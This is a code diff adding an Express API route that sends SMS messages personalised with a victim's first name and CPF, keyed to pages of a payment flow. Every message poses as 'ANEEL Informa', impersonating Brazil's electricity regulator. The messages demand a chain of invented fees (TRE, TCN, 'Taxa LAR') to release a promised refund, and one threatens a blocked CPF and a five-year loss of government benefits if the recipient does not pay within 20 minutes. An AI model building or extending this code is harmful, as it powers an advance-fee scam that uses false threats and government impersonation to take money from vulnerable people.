@@ -290,6 +290,96 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
   
+  /**
+   * Endpoint para enviar SMS de notificação personalizada com base na página acessada
+   */
+  app.post("/api/enviar-sms-notificacao", async (req: Request, res: Response) => {
+    try {
+      const { telefone, pagina, dados } = req.body;
+      
+      if (!telefone || !pagina) {
+        return res.status(400).json({ 
+          success: false, 
+          message: "Telefone e página são obrigatórios" 
+        });
+      }
+      
+      // Validar que dados contém as informações necessárias
+      if (!dados || !dados.nome || !dados.cpf) {
+        return res.status(400).json({ 
+          success: false, 
+          message: "Dados do usuário incompletos. É necessário nome e CPF." 
+        });
+      }
+      
+      // Extrair o primeiro nome
+      const primeiroNome = dados.nome.split(' ')[0];
+      
+      // Formatar o CPF para exibição
+      const cpfFormatado = dados.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+      
+      // Formatar valor se existir
+      const valorFormatado = dados.valor ? dados.valor.toFixed(2).replace('.', ',') : "0,00";
+      
+      // Determinar a mensagem com base na página acessada
+      let mensagem = "";
+      
+      switch (pagina) {
+        case "/pagamento":
+          mensagem = `ANEEL Informa: ${primeiroNome}, a TRE foi gerada. Pague em até 20 minutos ou seu CPF será bloqueado e você ficará impedido de receber qualquer benefício do governo por até 5 anos.`;
+          break;
+          
+        case "/taxa-complementar":
+          mensagem = `ANEEL Informa: ${primeiroNome}, O pagamento da TRE foi confirmado. O CPF ${cpfFormatado} foi vinculado ao protocolo de restituicao junto a ANEEL.`;
+          break;
+          
+        case "/pagamento-tcn":
+          mensagem = `ANEEL Informa: ${primeiroNome}, a TCN foi gerada. O pagamento e obrigatorio para aprovar e liberar sua restituicao de R$ ${valorFormatado}. Sem ele, o processo sera cancelado.`;
+          break;
+          
+        case "/taxa-lar":
+          mensagem = `ANEEL Informa: ${primeiroNome}, O pagamento da TCN foi confirmado. Sua solicitacao foi aprovada e sua restituicao no valor de R$ ${valorFormatado} esta sendo processada.`;
+          break;
+          
+        case "/pagamento-lar":
+          mensagem = `ANEEL Informa: ${primeiroNome}, A Taxa LAR é para quem nao quer esperar 15 dias. Para receber sua restituicao de R$ ${valorFormatado} em ate 60 min, pague agora mesmo.`;
+          break;
+          
+        case "/sucesso":
+          mensagem = `ANEEL Informa: ${primeiroNome}, O pagamento da Taxa LAR foi confirmado com sucesso. Sua restituicao no valor de R$ ${valorFormatado} sera depositada em ate 60 minutos.`;
+          break;
+          
+        case "/sucesso-padrao":
+          mensagem = `ANEEL Informa: ${primeiroNome}, Voce escolheu aguardar 15 dias. Essa é sua ultima chance de pagar a Taxa LAR e receber seu valor de R$ ${valorFormatado} em ate 60 minutos. Nao perca!`;
+          break;
+          
+        default:
+          return res.status(400).json({ 
+            success: false, 
+            message: "Página não suportada para envio de notificações SMS" 
+          });
+      }
+      
+      // Enviar a mensagem via SMS
+      const resultado = await smsService.sendNotification(telefone, mensagem);
+      
+      if (!resultado.success) {
+        return res.status(500).json({ 
+          success: false, 
+          message: resultado.message || "Erro ao enviar notificação SMS"
+        });
+      }
+      
+      return res.json({ 
+        success: true,
+        mensagem: mensagem
+      });
+    } catch (error) {
+      console.error("Erro ao enviar notificação SMS:", error);
+      return res.status(500).json({ success: false, message: "Erro interno ao processar requisição" });
+    }
+  });
+  
   // Rota para detectar localização por IP
   app.get('/api/detectar-estado', async (req: Request, res: Response) => {
     try {
